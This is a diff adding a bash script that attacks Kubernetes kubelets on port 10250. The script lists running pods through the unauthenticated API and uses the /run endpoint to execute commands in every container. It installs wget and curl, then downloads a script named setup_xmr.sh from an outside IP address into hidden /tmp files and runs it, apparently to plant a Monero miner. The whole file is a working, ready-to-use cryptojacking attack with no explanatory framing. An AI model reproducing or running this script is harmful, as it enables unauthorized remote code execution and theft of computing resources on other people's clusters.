@@ -1,0 +1,61 @@
+#!/bin/bash
+clear
+echo ''
+echo ''
+T1OUT="120"
+TEMPFILE="/tmp/"$RANDOM$RANDOM$RANDOM
+
+if [ -z "$1" ]; then read -p "IP: " theip ; else theip=$1; fi
+
+timeout -s SIGKILL 20 curl -sk https://$theip:10250/runningpods/ 2>/dev/null 1>/dev/null
+RESULTCHECK=$?
+
+if [ "$RESULTCHECK" = "0" ];then
+ 
+timeout -s SIGKILL $T1OUT curl -sLk https://$theip:10250/runningpods/ | jq . | grep 'namespace'
+if [ -f $TEMPFILE ]; then rm -f $TEMPFILE; fi
+timeout -s SIGKILL $T1OUT curl -sLk https://$theip:10250/runningpods/ | jq -r '.items[] | .metadata.namespace + " " + .metadata.name + " " + .spec.containers[].name' >> $TEMPFILE
+
+while read namespace podname containername; do
+echo ''
+echo -e "\e[1;33;41m"$namespace" "$podname" "$containername"\033[0m";
+echo ' '
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt update --fix-missing"
+echo ' '
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk update"
+echo ' '
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y bash"
+echo ' '
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y wget"
+echo ' '
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y curl"
+echo ' '
+
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y bash"
+echo ' '
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y wget"
+echo ' '
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y curl"
+echo ' '
+
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add bash"
+echo ' '
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add wget"
+echo ' '
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add curl"
+echo ' '
+
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="wget http://45.9.148.35/chimaera/sh/setup_xmr.sh -O /tmp/.x1mr"
+echo ' '
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="curl http://45.9.148.35/chimaera/sh/setup_xmr.sh -o /tmp/.x2mr"
+echo ' '
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x1mr"
+echo ' '
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x2mr"
+echo ' '
+done < $TEMPFILE
+fi
+rm -f $TEMPFILE
+exit
+
+
